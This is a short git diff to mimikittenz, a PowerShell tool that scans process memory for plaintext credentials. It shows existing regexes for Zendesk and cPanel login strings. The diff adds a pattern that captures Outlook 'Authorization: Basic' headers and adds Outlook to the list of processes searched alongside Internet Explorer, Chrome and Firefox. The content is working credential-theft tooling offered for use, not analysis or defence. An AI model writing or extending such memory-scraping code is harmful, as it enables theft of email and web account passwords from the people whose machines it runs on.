@@ -528,8 +528,14 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
+    
+# Desktop Email
+
+    # Outlook
+    [mimikittenz.MemProcInspector]::AddRegex("Outlook","Authorization: Basic .{1,100}")
+    
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox", "outlook")
 
 write-output $matchesFound
 }
